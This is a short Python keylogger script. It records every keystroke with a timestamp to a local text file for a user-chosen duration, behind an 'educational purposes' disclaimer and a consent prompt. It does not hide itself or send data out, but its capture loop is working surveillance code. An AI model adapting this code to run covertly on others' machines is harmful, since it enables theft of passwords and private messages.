import pynput
import time
import os
import sys

log_file_path = "keylogger_store.txt"

def keylogger(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        event = f"{timestamp} - {key}\n"
    with open(log_file_path, "a") as log_file:
        log_file.write(event)

print("---------------- Keylogger Disclaimer ----------------")
print("\nThis keylogger program is intended for educational and ethical purposes only.")
print("Unauthorized use, distribution, or modification of this program is strictly prohibited.")
print("By using this program, you agree to the following terms and conditions:")
print("\n1. You will only use this program on devices and systems for which you have explicit permission.")
print("2. You will not use this program to violate any laws, regulations, or terms of service.")
print("3. You will not use this program to harm, disrupt, or exploit any devices or systems.")
print("4. You will not use this program to intercept, collect, or store any sensitive or confidential information.")
print("5. You will not redistribute or sell this program without the express permission of the author.")
print("6. The author is not responsible for any damages or losses incurred as a result of using this program.")
print("7. You will respect the privacy and security of all devices and systems you interact with using this program.")

accept_terms = input("\nDo you accept these terms and conditions? (Yes/No): ")

if accept_terms.strip().lower() != 'yes':
    print("You must accept the terms and conditions before using this program.")
    sys.exit()

try:
    log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))
except ValueError:
    print("Invalid duration. Please enter a valid number.")
    sys.exit()

listener = pynput.keyboard.Listener(on_press=keylogger)
listener.start()

start_time = time.time()
end_time = start_time + log_duration

while time.time() < end_time:
    time.sleep(1)

listener.stop()

print("\nThe log file has been saved to:", os.path.abspath(log_file_path))
